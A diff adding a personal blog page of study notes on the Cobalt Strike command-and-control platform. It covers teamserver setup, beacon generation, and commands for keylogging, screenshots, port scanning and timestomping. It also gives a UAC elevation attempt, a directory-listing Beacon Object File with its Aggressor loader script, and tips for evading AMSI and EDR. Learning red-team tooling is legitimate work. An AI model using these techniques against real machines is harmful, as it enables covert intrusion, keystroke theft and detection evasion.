@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cobalt Strike Notes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <h1 style="text-align: left;">
+        <a href="index.html" style="text-decoration: none; color: grey;">KhoaLeDang's Blog</a>
+    </h1>
+    <h1 style="text-align: center;">COBALT STRIKE</h1>
+    <h1 style="font-size: 20;">TOPIC: PLATFORM COMPONENTS, SETUP, COMMANDS, BOF, CNA</h1>
+
+    <p class="mynote">
+        Cobalt Strike is not just a single tool but a platform consisting 4 core components:
+    </p>
+
+    <ul>
+        <li>Team Server: The center command server. It listens for incoming connections from <code class="inlinecode">beacon</code>, stores all the stolen data, manage
+all the clients and serves payload to <code class="inlinecode">beacon</code> on victim machine.</li>
+        <li>Client: Will connect to the <code class="inlinecode">teamserver</code>. Many clients can connect to the server and interact with each other on real
+time.For example: One person can Elevate Privileges, The others can extract information.</li>
+        <li>Beacon: The core payload executed on the victim computer. It only operates asychronoulsy, it sleeps for a period of time, wakes up contact
+with the team server to see if there's any new task. If there's nothing it will continue to sleep.
+This makes it harder to spot it. Beacon can transfer through many route: <code class="inlinecode">HTTP/HTTPS</code>, <code class="inlinecode">DNS</code>, <code class="inlinecode">SMB</code>.</li>
+        <li>Malleable C2: Firewalls nowadays are very smart it blocks a <code class="inlinecode">.exe</code> spotanously send encrypted data through a suspicious IP address.
+Malleable helps create configs, these configs will put the data inside fake HTML tags, So it will look like just a normal connection.</li>
+    </ul>
+
+    <h2>- How to setup a teamserver :</h2>
+
+    <p class="mynote">
+        1. Open jdk 20 or 21<br>
+        2. Go in Path inside environment table add the openjdk eg: <code class="inlinecode">C:\Test\OpenJDK\jdk-21.0.2\bin\</code><br>
+        3. add <code class="inlinecode">JAVA_HOME</code> is the jdk folder <code class="inlinecode">C:\Test\OpenJDK\jdk-21.0.2</code><br>
+        4. add <code class="inlinecode">JAVA_BIN</code> is the bin folder <code class="inlinecode">C:\Test\OpenJDK\jdk-21.0.2\bin</code><br>
+        5. run cmd as admin
+    </p>
+
+    <pre class="codeblock"><code class="codeblock">teamserver.bat [Host-IPaddress] [password] 1359593325 0ce2f55444e4793516b5afe967be9255 intl-cook.iqiyi.com_MDq.profile</code></pre>
+
+    <p class="mynote">
+        run this command to create server<br>
+        6. run <code class="inlinecode">start.bat</code> -&gt; done.
+    </p>
+
+    <h2>Some simple tools to use in cobaltsrike</h2>
+
+    <p class="mynote">
+        How to create a packages:<br>
+        first step go to attacks tab Windows Executable(S).<br>
+        You'll need to create your first listener. Create a name, choose <code class="inlinecode">beacon http</code>, the host ip<br>
+        then port I'll choose 80, save. Then choose your listener. Finally generate a beacon.<br>
+        When to client open the <code class="inlinecode">beacon.exe</code> you should receive connection.
+    </p>
+
+    <p class="mynote">
+        On the host machine right click on the client then choose interact to do some malicious stuff.<br>
+        for example: <code class="inlinecode">screenshot</code> to screenshot client screen.<br>
+        <code class="inlinecode">keylogger [PID] [x64/x86]</code> to log the keystroke.
+    </p>
+
+    <h2>How to portscan:</h2>
+
+    <pre class="codeblock"><code class="codeblock">portscan 192.168.231.0/24 22,445,3389 arp: this command will scan for open ports.</code></pre>
+
+    <h2>How to timestomp</h2>
+
+    <p class="mynote">
+        this command allows to copy the date modified to paste into another file.
+    </p>
+
+    <pre class="codeblock"><code class="codeblock">timestomp C:\Users\kingx\Documents\test.txt C:\Windows\System32\cmd.exe</code></pre>
+
+    <h2>Bypass UAC</h2>
+
+    <p class="mynote">
+        First you'll need an user that has administrator privilege, by doing
+    </p>
+
+    <pre class="codeblock"><code class="codeblock">shell net localgroup administrators</code></pre>
+
+    <p class="mynote">
+        to see if the target user has admin priv.<br>
+        And also you'll need the <code class="inlinecode">beacon.exe</code> to run as admin.<br>
+        Now you can try to paste the token from another trusted process into your beacon.
+    </p>
+
+    <pre class="codeblock"><code class="codeblock">elevate uac-token-duplication lab_http_port80</code></pre>
+
+    <p class="mynote">
+        . // THIS MAKES NO SENSE. Most of the Cobalt Strike Bypass UAC is outdated.
+    </p>
+
+    <h2>Beacon Object File</h2>
+    <p class="mynote">
+        Beacon Object File (BOF): BOF is a compiled C program that hasn't been linked (<code class="inlinecode">.o</code> or <code class="inlinecode">.obj</code>). Normal compilation links object files with system
+libraries to create a <code class="inlinecode">.exe</code> file. BOF skips the second step, it only needs the <code class="inlinecode">.o</code> file to run. Instead of relying on Windows, the Beacon will acts as the linker in the memory.
+    </p>
+
+    <p class="mynote">
+        - Life span of a BOF. When you execute by <code class="inlinecode">inline-execute</code>, Client Cobalt Strike will read <code class="inlinecode">.obj</code> from the client. Encrypt
+it and then send the BOF through the server right into the RAM of victim machine.<br>
+After that Beacon receive the BOF, allocate a hidden memory (read write), then put the code inside.<br>
+with the <code class="inlinecode">DECLSPEC_IMPORT</code>, Beacon will search inside Windows to find the address of the function and give it to BOF.<br>
+When all done Beacon will add the execute Privilege for the memory and call the function <code class="inlinecode">go()</code>. Finally when <code class="inlinecode">go()</code>
+is finished Beacon will free the memory, clean everything.
+    </p>
+
+    <h2>Why don't we use PowerShell and C# instead</h2>
+
+    <p class="mynote">
+        <code class="inlinecode">PowerShell</code> is heavily monitored by <code class="inlinecode">AMSI</code> (Antimalware Scan Interface). which scans and logs everything you scripts executed.<br>
+        C# (<code class="inlinecode">execute-assembly</code>): This technique force beacon to create a sacrifical process (<code class="inlinecode">notepad</code> or <code class="inlinecode">werfault.exe</code>) to
+inject C# code inside. The creation of a new process is easy to be spotted.<br>
+        BOF is Unmanaged Code that runs inline meaning it's not creating any new process.
+    </p>
+
+    <h2>Weakness: crash together.</h2>
+
+    <p class="mynote">
+        - Because the memory is inside Beacon itself so if your BOF get buffer overflow, Null Pointer Deference, Forgot to allocate memory,...<br>
+        The Beacon will crash immediately and lost connection to the victim machine.<br>
+        We need to use BOF because <code class="inlinecode">beacon</code> will use BOF to inject straight into the victim RAM.<br>
+        It also doesn't create a process, it has a small size so it can be transfer through internet very quickly
+    </p>
+    <p class="mynote">Here's a simple list directory command <code class="inlinecode">-ls</code> that will list all the files and directories in the given path.</p>
+
+    <pre class="codeblock"><code class="codeblock">void go(char* buff, int len) {
+    datap data;
+    WIN32_FIND_DATAA file_data;
+    HANDLE file_handle = NULL;
+    formatp out_buffer;
+    char* target_dir = NULL;
+    int length = 0;
+    BeaconDataParse(&amp;data, buff, len);</code></pre>
+
+    <p class="mynote"><strong>To get the args from the command line we need to use <code class="inlinecode">BeaconDataParse</code> to parse the data to <code class="inlinecode">datap</code> struct. We need to extract the data from <code class="inlinecode">buf</code>, <code class="inlinecode">len</code>.</strong></p>
+
+    <pre class="codeblock"><code class="codeblock">    target_dir = BeaconDataExtract(&amp;data, &amp;length);</code></pre>
+
+    <p class="mynote"><strong><code class="inlinecode">BeaconDataExtract</code> will extract String from the data to <code class="inlinecode">target_dir</code>. <code class="inlinecode">BeaconDataInt</code> will extract Integer from the data. The order depends on how we <code class="inlinecode">bof_pack</code> the arguments in cna.</strong></p>
+
+    <pre class="codeblock"><code class="codeblock">    int out_size = 0;
+    BeaconFormatAlloc(&amp;out_buffer, 8192);</code></pre>
+
+    <p class="mynote"><strong>If we use <code class="inlinecode">BeaconPrintf</code> it will sent the a lot data to the teamserver simutaneously. That's easy to be detected.
+        So we need to use <code class="inlinecode">BeaconFormatAlloc</code> to allocate a buffer to store the data. Then put all the print data inside the buffer by using <code class="inlinecode">BeaconFormatPrintf</code>.
+        Finally use <code class="inlinecode">BeaconFormatToString</code> to convert the buffer to a string and print it to the teamserver. This method only send one packet to the teamserver.</strong></p>
+
+    <pre class="codeblock"><code class="codeblock">    file_handle = FindFirstFileA(target_dir, &amp;file_data);
+    if (file_handle == INVALID_HANDLE_VALUE)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "FAILED TO FIND FIRST FILE\n");
+        BeaconFormatFree(&amp;out_buffer);
+        return;
+    }
+    BeaconFormatPrintf(&amp;out_buffer, "---List---\n");
+    do
+    {
+        BeaconFormatPrintf(&amp;out_buffer, "%s\n", file_data.cFileName);
+    } while (FindNextFileA(file_handle, &amp;file_data) != 0);
+
+    char* final_output = BeaconFormatToString(&amp;out_buffer, &amp;out_size);
+    BeaconPrintf(CALLBACK_OUTPUT, "%s\n", final_output);
+    FindClose(file_handle);
+    BeaconFormatFree(&amp;out_buffer);
+    return;
+}</code></pre>
+    <h2>CNA: Aggressor Script intergrated inside COBALT STRIKE using Sleep language</h2>
+
+    <p class="mynote">
+        <code class="inlinecode">#$0</code> is the source command. eg: "-ls C:\Windows"<br>
+        <code class="inlinecode">#$1</code> BeaconID: is beacon ID<br>
+        <code class="inlinecode">#$2</code> the first argument "C:\Windows"<br>
+        <code class="inlinecode">#$3 #$4</code> is the second, third...
+    </p>
+
+    <pre class="codeblock"><code class="codeblock">alias -ls {
+    local('$barch $handle $data $args');
+}</code></pre>
+    <p class="mynote">declarations: <code class="inlinecode">$</code> is a variable and <code class="inlinecode">@</code> is an array.</p>
+    <pre class="codeblock"><code class="codeblock">if (size(@_) != 2) {
+    berror($1, "How to use: -ls [path]");
+    return;
+}</code></pre>
+    <p class="mynote">Checks if input is valid.</p>
+    <pre class="codeblock"><code class="codeblock">$barch  = barch($1);
+$handle = openf(script_resource("BOF2. $+ $barch $+ .obj"));
+$data   = readb($handle, -1);
+closef($handle);
+</code></pre>
+    <div class="mynote">
+        <ul style="margin: 8px 0;">
+            <li><code class="inlinecode">$barch</code>: checks victim machine architecture (x86 or x64)</li>
+            <li><code class="inlinecode">$handle = openf(...)</code>: open file using the arch</li>
+            <li><code class="inlinecode">$data = readb(...)</code>: read whole file into <code class="inlinecode">$data</code> (-1 = all)</li>
+            <li><code class="inlinecode">closef($handle)</code>: close the handle</li>
+        </ul>
+    </div>
+    <pre class="codeblock"><code class="codeblock">$args = bof_pack($1, "z", $2);
+</code></pre>
+    <div class="mynote">
+        <ul style="margin: 8px 0;">
+            <li><code class="inlinecode">"Z"</code> is Wide String (UTF-16). Very important because many Win32 APIs require wide string (e.g. <code class="inlinecode">L"C:\\Windows"</code>). Extracts to: <code class="inlinecode">wchar_t* wstr = (wchar_t*)BeaconDataExtract(&amp;parser, &amp;len)</code></li>
+            <li><code class="inlinecode">z</code> = string, <code class="inlinecode">i</code> = integer, <code class="inlinecode">s</code> = short, <code class="inlinecode">b</code> = binary. You will need to provide an empty int to catch the string length.</li>
+            <li><code class="inlinecode">bof_pack</code> will take arguments from your command line but you need to write the type of the arguments in order.<br>
+            Example: <code class="inlinecode">bof_pack($1, "iz", $2, $3)</code> means it will take the first argument as an integer, and the second as a string.</li>
+            <li><strong>IMPORTANT:</strong> you have to take the arguments from the pack in the same order too. In this example you need to take <code class="inlinecode">BeaconDataInt()</code> then <code class="inlinecode">BeaconDataExtract()</code>.</li>
+        </ul>
+    </div>
+    <pre class="codeblock"><code class="codeblock">btask($1, "Sending to Beacon...");
+beacon_inline_execute($1, $data, "go", $args);
+</code></pre>
+    <div class="mynote">
+        <ul style="margin: 8px 0;">
+            <li><code class="inlinecode">beacon_inline_execute</code> will execute the payload</li>
+            <li><code class="inlinecode">$1</code> is the ID of the beacon</li>
+            <li><code class="inlinecode">$data</code> is our BOF.obj file</li>
+            <li><code class="inlinecode">go</code> is the entry point</li>
+            <li><code class="inlinecode">$args</code> is the arguments just loaded, will get pushed into <code class="inlinecode">char* args</code> inside <code class="inlinecode">go()</code> function</li>
+            <li><strong>OPSEC RULE:</strong> Never ask for <code class="inlinecode">RWX</code> (Read-Write-Execute) at the same time. EDRs will catch you. Always allocate <code class="inlinecode">RW</code> (Read-Write) → Copy code → <code class="inlinecode">VirtualProtect</code> to <code class="inlinecode">RX</code> (Read-Execute) → Run.</li>
+        </ul>
+    </div>
+    <p class="mynote">That's our CNA: <a href="SourceCode/SourceCNA.html">Source CNA</a>.</p>
+</body>
+</html>
